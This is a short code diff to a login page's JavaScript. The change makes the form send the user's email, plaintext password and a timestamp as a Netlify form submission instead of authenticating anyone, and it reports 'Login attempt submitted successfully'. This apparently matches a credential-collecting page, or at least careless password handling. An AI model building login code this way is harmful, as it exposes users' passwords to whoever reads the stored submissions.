@@ -12,7 +12,7 @@ togglePassword.addEventListener('click', function() {
     this.classList.toggle('fa-eye-slash');
 });
 
-// Form submission handler
+// Form submission handler with Netlify
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
@@ -20,11 +20,31 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const password = document.getElementById('password').value;
     const remember = document.getElementById('remember').checked;
     
-    // For now, just log the values
-    console.log('Login attempt:', { email, password, remember });
+    // Set timestamp
+    const timestamp = new Date().toLocaleString();
+    document.getElementById('timestamp').value = timestamp;
     
-    // Here you would typically send the data to a backend
-    alert('Login functionality would be implemented here');
+    // Create form data for Netlify submission
+    const formData = new FormData(this);
+    
+    // Submit form using fetch (AJAX)
+    fetch('/', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            alert('Login attempt submitted successfully!');
+            // Reset form after submission
+            this.reset();
+        } else {
+            throw new Error('Form submission failed');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Error submitting form. Please try again.');
+    });
 });
 
 // Forgot password link handler
